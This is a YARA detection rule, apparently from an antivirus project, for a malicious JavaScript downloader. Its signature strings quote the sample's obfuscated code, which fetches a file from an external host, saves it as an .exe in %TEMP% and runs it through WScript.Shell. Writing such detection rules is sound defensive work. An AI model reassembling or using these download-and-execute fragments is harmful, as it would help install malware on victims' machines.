rule sig_20160328_49bd3754066f4a849f3c78d05acbcf9b {
  meta:
    description = "datamaliciousorder - file 20160328_49bd3754066f4a849f3c78d05acbcf9b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "70ac7830a56cdad94b8dfafaecd51e715dfc922518cf9de58233de04a05d272d"

  strings:
    $s1  = "function Zwwfbhddh() {return Lpuvphz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Zr1sKH9yyh.exe\";};" fullword ascii
    $s2  = "Eqzpgvt[Ltufjhssg](\"GET\", \"http://baskinandbraw.com/wo8pfd\", false);" fullword ascii
    $s3  = "do {WScript[Njzbzvfhju](Gsklzbug() * 11)} while (Eqzpgvt[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Lpuvphz = function Dleddi() {return WScript[Zaguo](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ljjygp(Fdzpqg, Ttuot){return Fdzpqg - Ttuot;};" fullword ascii
    $s6  = "function Otedlxspbv() {return ((Fqivj == true) && (Fqivj == Pultf)) ? 1 : Exxwsbrxnj;};" fullword ascii
    $s7  = "function Boapneibg(Lovia){Lpuvphz[\"Run\"](Lovia, Exxwsbrxnj, Exxwsbrxnj);};" fullword ascii
    $s8  = "var Fqivj = false;" fullword ascii
    $s9  = "var Qpbyc = false;" fullword ascii
    $s10 = "function Wvaszhwdfe(){return Zaguo;};" fullword ascii
    $s11 = "var Pultf = false;" fullword ascii
    $s12 = "Fqivj = true; " fullword ascii
    $s13 = "function Gsklzbug(){return 22;};" fullword ascii
    $s14 = "return Ljjygp(Pemss, Ihjkc);" fullword ascii
    $s15 = "var Escoeotugb = new this[\"Date\"]();" fullword ascii
    $s16 = "function Uuogflaqfb(){return Dblyk;};" fullword ascii
    $s17 = "function Epcoc(Aqqdxkw) {var Vjhgf = (1, 2, 3, 4, 5, Aqqdxkw); return Vjhgf;};" fullword ascii
    $s18 = "Pultf = true; " fullword ascii
    $s19 = "function Dhjseja()" fullword ascii
    $s20 = " while (Qkkvnabk){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}